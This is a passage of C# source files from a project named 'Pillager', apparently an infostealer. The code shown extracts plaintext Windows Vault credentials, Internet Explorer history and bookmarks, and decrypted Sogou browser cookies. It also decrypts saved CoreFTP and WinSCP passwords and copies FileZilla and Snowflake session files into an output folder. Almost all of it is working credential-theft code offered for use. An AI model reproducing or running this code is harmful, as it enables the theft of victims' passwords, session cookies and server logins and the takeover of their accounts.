                object results;
                object partialElement = Marshal.PtrToStructure(vaultElementPtr, typeof(Native.VAULT_ITEM_ELEMENT));
                FieldInfo partialElementInfo = partialElement.GetType().GetField("Type");
                var partialElementType = partialElementInfo.GetValue(partialElement);

                IntPtr elementPtr = (IntPtr)(vaultElementPtr.ToInt64() + 16);
                switch ((int)partialElementType)
                {
                    case 7: // VAULT_ELEMENT_TYPE == String; These are the plaintext passwords!
                        IntPtr StringPtr = Marshal.ReadIntPtr(elementPtr);
                        results = Marshal.PtrToStringUni(StringPtr);
                        break;
                    case 0: // VAULT_ELEMENT_TYPE == bool
                        results = Marshal.ReadByte(elementPtr);
                        results = (bool)results;
                        break;
                    case 1: // VAULT_ELEMENT_TYPE == Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 2: // VAULT_ELEMENT_TYPE == Unsigned Short
                        results = Marshal.ReadInt16(elementPtr);
                        break;
                    case 3: // VAULT_ELEMENT_TYPE == Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 4: // VAULT_ELEMENT_TYPE == Unsigned Int
                        results = Marshal.ReadInt32(elementPtr);
                        break;
                    case 5: // VAULT_ELEMENT_TYPE == Double
                        results = Marshal.PtrToStructure(elementPtr, typeof(Double));
                        break;
                    case 6: // VAULT_ELEMENT_TYPE == GUID
                        results = Marshal.PtrToStructure(elementPtr, typeof(Guid));
                        break;
                    case 12: // VAULT_ELEMENT_TYPE == Sid
                        IntPtr sidPtr = Marshal.ReadIntPtr(elementPtr);
                        var sidObject = new System.Security.Principal.SecurityIdentifier(sidPtr);
                        results = sidObject.Value;
                        break;
                    default:
                        /* Several VAULT_ELEMENT_TYPES are currently unimplemented according to
                         * Lord Graeber. Thus we do not implement them. */
                        results = null;
                        break;
                }
                return results;
            }
            /* End helper function */

            Int32 vaultCount = 0;
            IntPtr vaultGuidPtr = IntPtr.Zero;
            var result = Native.VaultEnumerateVaults(0, ref vaultCount, ref vaultGuidPtr);

            if (result != 0)
            {
                throw new Exception("[ERROR] Unable to enumerate vaults. Error (0x" + result.ToString() + ")");
            }

            // Create dictionary to translate Guids to human readable elements
            IntPtr guidAddress = vaultGuidPtr;
            Dictionary<Guid, string> vaultSchema = new Dictionary<Guid, string>
            {
                { new Guid("2F1A6504-0641-44CF-8BB5-3612D865F2E5"), "Windows Secure Note" },
                { new Guid("3CCD5499-87A8-4B10-A215-608888DD3B55"), "Windows Web Password Credential" },
                { new Guid("154E23D0-C644-4E6F-8CE6-5069272F999F"), "Windows Credential Picker Protector" },
                { new Guid("4BF4C442-9B8A-41A0-B380-DD4A704DDB28"), "Web Credentials" },
                { new Guid("77BC582B-F0A6-4E15-4E80-61736B6F3B29"), "Windows Credentials" },
                { new Guid("E69D7838-91B5-4FC9-89D5-230D4D4CC2BC"), "Windows Domain Certificate Credential" },
                { new Guid("3E0E35BE-1B77-43E7-B873-AED901B6275B"), "Windows Domain Password Credential" },
                { new Guid("3C886FF3-2669-4AA2-A8FB-3F6759A77548"), "Windows Extended Credential" },
                { new Guid("00000000-0000-0000-0000-000000000000"), null }
            };

            for (int i = 0; i < vaultCount; i++)
            {
                // Open vault block
                object vaultGuidString = Marshal.PtrToStructure(guidAddress, typeof(Guid));
                Guid vaultGuid = new Guid(vaultGuidString.ToString());
                guidAddress = (IntPtr)(guidAddress.ToInt64() + Marshal.SizeOf(typeof(Guid)));
                IntPtr vaultHandle = IntPtr.Zero;
                string vaultType;
                vaultType = vaultSchema.ContainsKey(vaultGuid) ? vaultSchema[vaultGuid] : vaultGuid.ToString();
                result = Native.VaultOpenVault(ref vaultGuid, 0, ref vaultHandle);
                if (result != 0)
                {
                    throw new Exception("Unable to open the following vault: " + vaultType + ". Error: 0x" + result.ToString());
                }
                // Vault opened successfully! Continue.

                // Fetch all items within Vault
                int vaultItemCount = 0;
                IntPtr vaultItemPtr = IntPtr.Zero;
                result = Native.VaultEnumerateItems(vaultHandle, 512, ref vaultItemCount, ref vaultItemPtr);
                if (result != 0)
                {
                    throw new Exception("[ERROR] Unable to enumerate vault items from the following vault: " + vaultType + ". Error 0x" + result.ToString());
                }
                var structAddress = vaultItemPtr;
                if (vaultItemCount > 0)
                {
                    // For each vault item...
                    for (int j = 1; j <= vaultItemCount; j++)
                    {
                        // Begin fetching vault item...
                        var currentItem = Marshal.PtrToStructure(structAddress, VAULT_ITEM);
                        structAddress = (IntPtr)(structAddress.ToInt64() + Marshal.SizeOf(VAULT_ITEM));

                        IntPtr passwordVaultItem = IntPtr.Zero;
                        // Field Info retrieval
                        FieldInfo schemaIdInfo = currentItem.GetType().GetField("SchemaId");
                        Guid schemaId = new Guid(schemaIdInfo.GetValue(currentItem).ToString());
                        FieldInfo pResourceElementInfo = currentItem.GetType().GetField("pResourceElement");
                        IntPtr pResourceElement = (IntPtr)pResourceElementInfo.GetValue(currentItem);
                        FieldInfo pIdentityElementInfo = currentItem.GetType().GetField("pIdentityElement");
                        IntPtr pIdentityElement = (IntPtr)pIdentityElementInfo.GetValue(currentItem);
                        FieldInfo dateTimeInfo = currentItem.GetType().GetField("LastModified");
                        UInt64 lastModified = (UInt64)dateTimeInfo.GetValue(currentItem);

                        IntPtr pPackageSid = IntPtr.Zero;
                        if (OSMajor >= 6 && OSMinor >= 2)
                        {
                            // Newer versions have package sid
                            FieldInfo pPackageSidInfo = currentItem.GetType().GetField("pPackageSid");
                            pPackageSid = (IntPtr)pPackageSidInfo.GetValue(currentItem);
                            result = Native.VaultGetItem_WIN8(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, pPackageSid, IntPtr.Zero, 0, ref passwordVaultItem);
                        }
                        else
                        {
                            result = Native.VaultGetItem_WIN7(vaultHandle, ref schemaId, pResourceElement, pIdentityElement, IntPtr.Zero, 0, ref passwordVaultItem);
                        }

                        if (result != 0)
                        {
                            throw new Exception("Error occured while retrieving vault item. Error: 0x" + result.ToString());
                        }
                        object passwordItem = Marshal.PtrToStructure(passwordVaultItem, VAULT_ITEM);
                        FieldInfo pAuthenticatorElementInfo = passwordItem.GetType().GetField("pAuthenticatorElement");
                        IntPtr pAuthenticatorElement = (IntPtr)pAuthenticatorElementInfo.GetValue(passwordItem);
                        // Fetch the credential from the authenticator element
                        object cred = GetVaultElementValue(pAuthenticatorElement);
                        object packageSid = null;
                        if (pPackageSid != IntPtr.Zero)
                        {
                            packageSid = GetVaultElementValue(pPackageSid);
                        }
                        if (cred != null) // Indicates successful fetch
                        {
                            sb.AppendLine("Vault Type   : {"+ vaultType + "}");
                            object resource = GetVaultElementValue(pResourceElement);
                            if (resource != null)
                            {
                                sb.AppendLine("Vault Type   : {" + resource + "}");
                            }
                            object identity = GetVaultElementValue(pIdentityElement);
                            if (identity != null)
                            {
                                sb.AppendLine("Vault Type   : {" + identity + "}");
                            }
                            if (packageSid != null)
                            {
                                sb.AppendLine("Vault Type   : {" + packageSid + "}");
                            }
                            sb.AppendLine("Vault Type   : {" + cred + "}");
                            // Stupid datetime
                            sb.AppendLine("LastModified : {"+ DateTime.FromFileTimeUtc((long)lastModified) + "}");
                            sb.AppendLine();
                        }
                    }
                }
            }

            return sb.ToString();
        }

        public static string IE_history() 
        {
            StringBuilder sb = new StringBuilder();
            RegistryKey myreg = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Internet Explorer\\TypedURLs");
            string[] urls = new string[26];

            for (int i = 1; i < 26; i++)
            {
                try
                {
                    urls[i] = myreg.GetValue("url" + i.ToString())?.ToString();
                }
                catch { }
            }
            foreach (string url in urls)
            {
                if (url != null)
                {
                    sb.AppendLine(url);
                }
            }
            return sb.ToString();
        }

        public static string IE_books()
        {
            StringBuilder sb = new StringBuilder();
            string book_path = Environment.GetFolderPath(Environment.SpecialFolder.Favorites);

            string[] files = Directory.GetFiles(book_path, "*.url", SearchOption.AllDirectories);

            foreach (string url_file_path in files)
            {
                if (File.Exists(url_file_path))
                {
                    string booktext = File.ReadAllText(url_file_path);
                    Match match = Regex.Match(booktext, @"URL=(.*?)\n");
                    sb.AppendLine($"{url_file_path}");
                    sb.AppendLine($"\t{match.Value}");
                }
            }

            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string savepath = Path.Combine(path, BrowserName);
                Directory.CreateDirectory(savepath);
                string passwords = IE_passwords();
                string books = IE_books();
                string history = IE_history();
                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
            }
            catch { }
        }
    }
}
```

`Pillager/Browsers/OldSogou.cs`:

```cs
using Pillager.Helper;
using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Browsers
{
    internal static class OldSogou
    {
        public static string BrowserName = "OldSogouExplorer";

        public static string BrowserPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                "SogouExplorer\\Webkit\\Default");

        public static byte[] MasterKey;

        public static byte[] GetMasterKey()
        {
            string filePath = Path.Combine(Directory.GetParent(BrowserPath).FullName, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private static byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }

            return decryptedData;
        }

        public static string Sogou_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            string chrome_cookie_path = Path.Combine(BrowserPath, "Cookies");
            if (!File.Exists(chrome_cookie_path)) return null;
            try
            {
                string cookie_tempFile = Path.GetTempFileName();
                try
                {
                    File.Copy(chrome_cookie_path, cookie_tempFile, true);
                }
                catch
                {
                    byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
                    if (ckfile != null)
                    {
                        File.WriteAllBytes(cookie_tempFile, ckfile);
                    }
                }
                SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                if (!handler.ReadTable("cookies")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string host_key = handler.GetValue(i, "host_key");
                    string name = handler.GetValue(i, "name");
                    string crypt = handler.GetValue(i, "encrypted_value");
                    string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                    cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                }

                File.Delete(cookie_tempFile);
            }
            catch { }

            return cookies.ToString();
        }

        public static string Sogou_history()
        {
            StringBuilder history = new StringBuilder();
            string sogou_History_path = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "HistoryUrl3.db");
            if (!File.Exists(sogou_History_path)) return null;
            try
            {
                string history_tempFile = Path.GetTempFileName();
                File.Copy(sogou_History_path, history_tempFile, true);
                SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                if (!handler.ReadTable("UserRankUrl")) return null;
                for (int i = 0; i < handler.GetRowCount(); i++)
                {
                    string url = handler.GetValue(i, "id");
                    history.AppendLine(url);
                }
                File.Delete(history_tempFile);
            }
            catch { }
            return history.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                if (!Directory.Exists(BrowserPath)) return;
                MasterKey = GetMasterKey();
                string savepath = Path.Combine(path, BrowserName);
                Directory.CreateDirectory(savepath);
                string cookies = Sogou_cookies();
                string history = Sogou_history();
                string FormData3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "FormData3.dat");
                string favorite3 = Path.Combine(Directory.GetParent(Directory.GetParent(BrowserPath).FullName).FullName, "favorite3.dat");
                if (File.Exists(FormData3)) File.Copy(FormData3, Path.Combine(savepath, "FormData3.dat"));
                if (File.Exists(favorite3)) File.Copy(favorite3, Path.Combine(savepath, "favorite3.dat"));
                if (!string.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
                if (!string.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
            }
            catch { }
        }
    }
}

```

`Pillager/FTPs/CoreFTP.cs`:

```cs
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Linq;
using System.Runtime.Remoting.Channels;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;

namespace Pillager.FTPs
{
    internal class CoreFTP
    {
        public static string FTPName = "CoreFTP";

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string rkPath = "Software\\FTPWare\\CoreFTP\\Sites";
            using (RegistryKey rk = Registry.CurrentUser.OpenSubKey(rkPath, false))
            {
                if (rk != null)
                {
                    foreach (string text in rk.GetSubKeyNames())
                    {
                        using (RegistryKey rkSession = Registry.CurrentUser.OpenSubKey(Path.Combine(rkPath, text), false))
                        {
                            object value = rkSession.GetValue("Host");
                            object value2 = rkSession.GetValue("Port");
                            object value3 = rkSession.GetValue("User");
                            object value4 = rkSession.GetValue("PW");
                            if (value != null && value3 != null && value4 != null)
                            {
                                sb.AppendLine("Server:"+ string.Format("{0}:{1}", value.ToString(), value2.ToString()));
                                sb.AppendLine(value3.ToString());
                                sb.AppendLine(Decrypt(value4.ToString(), "hdfzpysvpzimorhk"));
                                sb.AppendLine();
                            }
                        }
                    }
                }
            }
            return sb.ToString();
        }

        private static string Decrypt(string encryptedData, string key)
        {
            byte[] array = Encoding.UTF8.GetBytes(key);
            PadToMultipleOf(ref array, 8);
            byte[] array2 = ConvertHexStringToByteArray(encryptedData);
            string text;
            using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
            {
                rijndaelManaged.KeySize = array.Length * 8;
                rijndaelManaged.Key = array;
                rijndaelManaged.Mode = CipherMode.ECB;
                rijndaelManaged.Padding = PaddingMode.None;
                using (ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor())
                {
                    byte[] array3 = cryptoTransform.TransformFinalBlock(array2, 0, array2.Length);
                    text = Encoding.UTF8.GetString(array3);
                }
            }
            return text;
        }

        private static void PadToMultipleOf(ref byte[] src, int pad)
        {
            int num = (src.Length + pad - 1) / pad * pad;
            Array.Resize(ref src, num);
        }

        private static byte[] ConvertHexStringToByteArray(string hexString)
        {
            if (hexString.Length % 2 != 0)
            {
                throw new ArgumentException(string.Format(CultureInfo.InvariantCulture, "The binary key cannot have an odd number of digits: {0}", hexString));
            }
            byte[] array = new byte[hexString.Length / 2];
            for (int i = 0; i < array.Length; i++)
            {
                string text = hexString.Substring(i * 2, 2);
                array[i] = byte.Parse(text, NumberStyles.HexNumber, CultureInfo.InvariantCulture);
            }
            return array;
        }

        public static void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, FTPName + ".txt"), output);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/FTPs/FileZilla.cs`:

```cs
using System;
using System.IO;

namespace Pillager.FTPs
{
    internal class FileZilla
    {
        public static string FTPName = "FileZilla";

        public static void Save(string path)
        {
            try
            {
                string xmlpath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), @"FileZilla\recentservers.xml");
                if (File.Exists(xmlpath))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.Copy(xmlpath, Path.Combine(savepath, FTPName + ".txt"));
                }
            }
            catch { }
        }
    }
}

```

`Pillager/FTPs/Snowflake.cs`:

```cs
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Principal;
using System.Text;

namespace Pillager.FTPs
{
    internal class Snowflake
    {
        public static string FTPName = "Snowflake";

        public static void Save(string path)
        {
            try
            {
                string jsonpath = Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "snowflake-ssh\\session-store.json");
                if (File.Exists(jsonpath))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.Copy(jsonpath, Path.Combine(savepath, "session-store.json"));
                }
            }
            catch { }
        }
    }
}

```

`Pillager/FTPs/WinSCP.cs`:

```cs
using System.IO;
using System.Text;
using Microsoft.Win32;

namespace Pillager.FTPs
{
    internal class WinSCP
    {
        public static string FTPName = "WinSCP";

        static readonly int PW_MAGIC = 0xA3;
        static readonly char PW_FLAG = (char)0xFF;

        struct Flags
        {
            public char flag;
            public string remainingPass;
        }

        private static Flags DecryptNextCharacterWinSCP(string passwd)
        {
            Flags Flag;
            string bases = "0123456789ABCDEF";

            int firstval = bases.IndexOf(passwd[0]) * 16;
            int secondval = bases.IndexOf(passwd[1]);
            int Added = firstval + secondval;
            Flag.flag = (char)(((~(Added ^ PW_MAGIC) % 256) + 256) % 256);
            Flag.remainingPass = passwd.Substring(2);
            return Flag;
        }

        private static string DecryptWinSCPPassword(string Host, string userName, string passWord)
        {
            var clearpwd = string.Empty;
            char length;
            string unicodeKey = userName + Host;
            Flags Flag = DecryptNextCharacterWinSCP(passWord);

            int storedFlag = Flag.flag;

            if (storedFlag == PW_FLAG)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                length = Flag.flag;
            }
            else
            {
                length = Flag.flag;
            }

            Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
            Flag.remainingPass = Flag.remainingPass.Substring(Flag.flag * 2);

            for (int i = 0; i < length; i++)
            {
                Flag = DecryptNextCharacterWinSCP(Flag.remainingPass);
                clearpwd += Flag.flag;
            }
            if (storedFlag == PW_FLAG)
            {
                clearpwd = clearpwd.Substring(0, unicodeKey.Length) == unicodeKey ? clearpwd.Substring(unicodeKey.Length) : "";
            }
            return clearpwd;
        }

        public static string GetInfo()
        {
            StringBuilder sb = new StringBuilder();
            string registry = @"Software\Martin Prikryl\WinSCP 2\Sessions";
            var registryKey = Registry.CurrentUser.OpenSubKey(registry);
            if (registryKey == null) return "";
            foreach (string rname in registryKey.GetSubKeyNames())
            {
                using (var session = registryKey.OpenSubKey(rname))
                {
                    if (session != null)
                    {
                        string hostname = (session.GetValue("HostName") != null) ? session.GetValue("HostName").ToString() : "";
                        if (!string.IsNullOrEmpty(hostname))
                        {
                            try
                            {
                                string username = session.GetValue("UserName").ToString();
                                string password = session.GetValue("Password").ToString();
                                sb.AppendLine("hostname: "+ hostname);
                                sb.AppendLine("username: " + username);
                                sb.AppendLine("rawpass: " + password);
                                sb.AppendLine("password: " + DecryptWinSCPPassword(hostname, username, password));
                            }
                            catch
                            { }
                        }
                    }
                }
            }


            return sb.ToString();
        }

        public static void Save(string path)
        {
            try
            {
                string output = GetInfo();
                if (!string.IsNullOrEmpty(output))
                {
                    string savepath = Path.Combine(path, FTPName);
                    Directory.CreateDirectory(savepath);
                    File.WriteAllText(Path.Combine(savepath, FTPName + ".txt"), output);
                }
            }
            catch { }
        }
    }
}

```

`Pillager/Helper/AesGcm.cs`:

```cs
using System;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Helper
{
    //AES GCM from https://github.com/dvsekhvalnov/jose-jwt
    internal class AesGcm
    {
        public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
        {
            IntPtr hAlg = OpenAlgorithmProvider(Native.BCRYPT_AES_ALGORITHM, Native.MS_PRIMITIVE_PROVIDER, Native.BCRYPT_CHAIN_MODE_GCM);
            var keyDataBuffer = ImportKey(hAlg, key, out var hKey);

            byte[] plainText;

            Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO authInfo = new Native.BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(iv, aad, authTag);
            byte[] ivData = new byte[MaxAuthTagSize(hAlg)];

            int plainTextSize = 0;

            uint status = Native.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, null, 0, ref plainTextSize, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException(
                    $"Native.BCryptDecrypt() (get size) failed with status code: {status}");

            plainText = new byte[plainTextSize];

            status = Native.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref authInfo, ivData, ivData.Length, plainText, plainText.Length, ref plainTextSize, 0x0);

            if (status == Native.STATUS_AUTH_TAG_MISMATCH)
                throw new CryptographicException("Native.BCryptDecrypt(): authentication tag mismatch");

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException($"Native.BCryptDecrypt() failed with status code:{status}");

            authInfo.Dispose();

            Native.BCryptDestroyKey(hKey);
            Marshal.FreeHGlobal(keyDataBuffer);
            Native.BCryptCloseAlgorithmProvider(hAlg, 0x0);

            return plainText;
        }

        private int MaxAuthTagSize(IntPtr hAlg)
        {
            byte[] tagLengthsValue = GetProperty(hAlg, Native.BCRYPT_AUTH_TAG_LENGTH);

            return BitConverter.ToInt32(new[] { tagLengthsValue[4], tagLengthsValue[5], tagLengthsValue[6], tagLengthsValue[7] }, 0);
        }

        private IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
        {
            uint status = Native.BCryptOpenAlgorithmProvider(out var hAlg, alg, provider, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException(
                    $"Native.BCryptOpenAlgorithmProvider() failed with status code:{status}");

            byte[] chainMode = Encoding.Unicode.GetBytes(chainingMode);
            status = Native.BCryptSetAlgorithmProperty(hAlg, Native.BCRYPT_CHAINING_MODE, chainMode, chainMode.Length, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException(
                    $"Native.BCryptSetAlgorithmProperty(Native.BCRYPT_CHAINING_MODE, Native.BCRYPT_CHAIN_MODE_GCM) failed with status code:{status}");

            return hAlg;
        }

        private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
        {
            byte[] objLength = GetProperty(hAlg, Native.BCRYPT_OBJECT_LENGTH);

            int keyDataSize = BitConverter.ToInt32(objLength, 0);

            IntPtr keyDataBuffer = Marshal.AllocHGlobal(keyDataSize);

            byte[] keyBlob = Concat(Native.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(0x1), BitConverter.GetBytes(key.Length), key);

            uint status = Native.BCryptImportKey(hAlg, IntPtr.Zero, Native.BCRYPT_KEY_DATA_BLOB, out hKey, keyDataBuffer, keyDataSize, keyBlob, keyBlob.Length, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException($"Native.BCryptImportKey() failed with status code:{status}");

            return keyDataBuffer;
        }

        private byte[] GetProperty(IntPtr hAlg, string name)
        {
            int size = 0;

            uint status = Native.BCryptGetProperty(hAlg, name, null, 0, ref size, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException(
                    $"Native.BCryptGetProperty() (get size) failed with status code:{status}");

            byte[] value = new byte[size];

            status = Native.BCryptGetProperty(hAlg, name, value, value.Length, ref size, 0x0);

            if (status != Native.ERROR_SUCCESS)
                throw new CryptographicException($"Native.BCryptGetProperty() failed with status code:{status}");

            return value;
        }

        public byte[] Concat(params byte[][] arrays)
        {
            int len = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                len += array.Length;
            }

            byte[] result = new byte[len - 1 + 1];
            int offset = 0;

            foreach (byte[] array in arrays)
            {
                if (array == null)
                    continue;
                Buffer.BlockCopy(array, 0, result, offset, array.Length);
                offset += array.Length;
            }

            return result;
        }
    }
}

```

`Pillager/Helper/Asn1Der.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Text;

namespace Pillager.Helper
{
    // Adapted from firepwd.net (https://github.com/gourk/FirePwd.Net)
    public class Asn1Der
    {
        public enum Type
        {
            Sequence = 0x30,
            Integer = 0x02,
            BitString = 0x03,
            OctetString = 0x04,
            Null = 0x05,
            ObjectIdentifier = 0x06
        }


        public Asn1DerObject Parse(byte[] dataToParse)
        {
            Asn1DerObject parsedData = new Asn1DerObject();

            for (int i = 0; i < dataToParse.Length; i++)
            {
                byte[] data;
                int len;
                switch ((Type)dataToParse[i])
                {
                    case Type.Sequence:
                        if (parsedData.Lenght == 0)
                        {
                            parsedData.Type = Type.Sequence;
                            parsedData.Lenght = dataToParse.Length - (i + 2);
                            data = new byte[parsedData.Lenght];
                        }
                        else
                        {
                            parsedData.objects.Add(new Asn1DerObject
                            {
                                Type = Type.Sequence,
                                Lenght = dataToParse[i + 1]
                            });
                            data = new byte[dataToParse[i + 1]];
                        }
                        len = (data.Length > dataToParse.Length - (i + 2)) ? dataToParse.Length - (i + 2) : data.Length;
                        Array.Copy(dataToParse, i + 2, data, 0, len);
                        parsedData.objects.Add(Parse(data));
                        i = i + 1 + dataToParse[i + 1];
                        break;
                    case Type.Integer:
                        parsedData.objects.Add(new Asn1DerObject
                        {
                            Type = Type.Integer,
                            Lenght = dataToParse[i + 1]
                        });
                        data = new byte[dataToParse[i + 1]];
                        len = ((i + 2) + dataToParse[i + 1] > dataToParse.Length) ? dataToParse.Length - (i + 2) : dataToParse[i + 1];
                        Array.Copy(dataToParse, i + 2, data, 0, len);
                        var parsedDataArray = parsedData.objects.ToArray();
                        parsedData.objects[parsedDataArray.Length - 1].Data = data;
                        i = i + 1 + parsedData.objects[parsedDataArray.Length - 1].Lenght;
                        break;
                    case Type.OctetString:
                        parsedData.objects.Add(new Asn1DerObject
                        {
                            Type = Type.OctetString,
                            Lenght = dataToParse[i + 1]
                        });
                        data = new byte[dataToParse[i + 1]];
                        len = ((i + 2) + dataToParse[i + 1] > dataToParse.Length) ? dataToParse.Length - (i + 2) : dataToParse[i + 1];
                        Array.Copy(dataToParse, i + 2, data, 0, len);
                        var parsedDataArrayTwo = parsedData.objects.ToArray();
                        parsedData.objects[parsedDataArrayTwo.Length - 1].Data = data;
                        i = i + 1 + parsedData.objects[parsedDataArrayTwo.Length - 1].Lenght;
                        break;
                    case Type.ObjectIdentifier:
                        parsedData.objects.Add(new Asn1DerObject
                        {
                            Type = Type.ObjectIdentifier,
                            Lenght = dataToParse[i + 1]
                        });
                        data = new byte[dataToParse[i + 1]];
                        len = ((i + 2) + dataToParse[i + 1] > dataToParse.Length) ? dataToParse.Length - (i + 2) : dataToParse[i + 1];
                        Array.Copy(dataToParse, i + 2, data, 0, len);
                        var parsedDataArrayThree = parsedData.objects.ToArray();
                        parsedData.objects[parsedDataArrayThree.Length - 1].Data = data;
                        i = i + 1 + parsedData.objects[parsedDataArrayThree.Length - 1].Lenght;
                        break;
                }
            }

            return parsedData;
        }
    }

    public class Asn1DerObject
    {
        public Asn1Der.Type Type { get; set; }
        public int Lenght { get; set; }
        public List<Asn1DerObject> objects { get; set; } = new List<Asn1DerObject>();
        public byte[] Data { get; set; }

        public override string ToString()
        {
            StringBuilder str = new StringBuilder();
            StringBuilder data = new StringBuilder();
            switch (Type)
            {
                case Asn1Der.Type.Sequence:
                    str.AppendLine("SEQUENCE {");
                    break;
                case Asn1Der.Type.Integer:
                    foreach (byte octet in Data)
                    {
                        //data.Append((int)octet);
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine("\tINTEGER " + data);
                    break;
                case Asn1Der.Type.OctetString:

                    foreach (byte octet in Data)
                    {
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine("\tOCTETSTRING " + data);
                    break;
                case Asn1Der.Type.ObjectIdentifier:
                    foreach (byte octet in Data)
                    {
                        data.AppendFormat("{0:X2}", octet);
                    }
                    str.AppendLine("\tOBJECTIDENTIFIER " + data);
                    break;
            }
            foreach (Asn1DerObject obj in objects)
            {
                str.Append(obj);
            }

            if (Type.Equals(Asn1Der.Type.Sequence))
            {
                str.AppendLine("}");
            }
            return str.ToString();
        }
    }
}

```

`Pillager/Helper/Bcrypt.cs`:

```cs
using System;
using System.Collections.Generic;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace Pillager.Helper
{
    internal class Bcrypt
    {

        private static readonly byte[] _bcryptCipherText = Encoding.ASCII.GetBytes("OxychromaticBlowfishSwatDynamite");

        /// <summary>
        /// bcrypt_hash
        /// </summary>
        /// <param name="blowfish">blowfish object to use</param>
        /// <param name="sha2pass">SHA512 of password</param>
        /// <param name="sha2salt">SHA512 of salt</param>
        /// <returns></returns>
